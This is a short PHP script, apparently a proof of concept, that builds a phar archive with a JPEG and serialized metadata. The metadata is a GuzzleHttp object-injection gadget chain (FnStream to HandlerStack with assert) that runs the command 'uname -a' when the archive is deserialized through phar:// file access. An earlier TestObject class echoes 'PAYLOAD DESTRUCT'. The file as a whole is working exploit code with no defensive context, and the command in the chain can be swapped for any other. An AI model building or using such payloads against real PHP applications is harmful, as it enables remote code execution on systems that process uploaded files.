<?php
/**
 * Created by PhpStorm.
 * User: alex
 * Date: 20.08.2018
 * Time: 19:40
 */
class TestObject
{
    function __destruct()
    {
//        parent::__destruct();
        // TODO: Implement __destruct() method.
        echo "PAYLOAD DESTRUCT!!!!!\n";
        return $_SERVER;
    }
}

/*
 * must contain
 *  - stub
 *  - manifest (serial metadata)
 *  - file contents
 *  - signature
 *
 */

@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->addFile('face.jpg');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new TestObject();
//$phar->setMetadata($o);
$phar->setMetadata("O:24:\"GuzzleHttp\Psr7\FnStream\":2:{s:33:\"GuzzleHttp\Psr7\FnStreammethods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\HandlerStack\":3:{s:32:\"GuzzleHttp\HandlerStackhandler\";s:8:\"uname -a\";s:30:\"GuzzleHttp\HandlerStackstack\";a:1:{i:0;a:1:{i:0;s:6:\"assert\";}}s:31:\"GuzzleHttp\HandlerStackcached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}");
$phar->stopBuffering();
